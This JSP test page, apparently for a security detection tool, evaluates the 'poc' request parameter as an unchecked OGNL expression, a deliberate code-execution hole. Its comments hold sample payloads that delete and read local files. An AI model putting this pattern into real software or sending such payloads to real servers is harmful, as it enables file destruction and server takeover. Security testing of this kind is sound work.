<%@ page import="ognl.Ognl" %>
<%@ page import="ognl.OgnlContext" %>
<%@ page import="org.apache.commons.io.IOUtils" %>
<%@ page import="java.io.InputStream" %>

<%-- ognl-file.jsp?poc=new%20java.io.File(%22/Users/phoebe/Downloads/323.txt%22).delete() --%>
<%-- new%20java.io.BufferedReader(new%20java.io.FileReader("/Users/phoebe/Downloads/333.git")).readLine() --%>
<%-- 文件操作相关类没有进行拦截，示例进行了删除文件操作 --%>
<%

    String poc = request.getParameter("poc");
    OgnlContext context = new OgnlContext();
    Object obj = Ognl.getValue(poc, context, context.getRoot());

    if (obj instanceof InputStream) {
        out.println(IOUtils.toString((InputStream) obj));
    } else {
        out.println(obj);
    }

    out.flush();
    out.close();
%>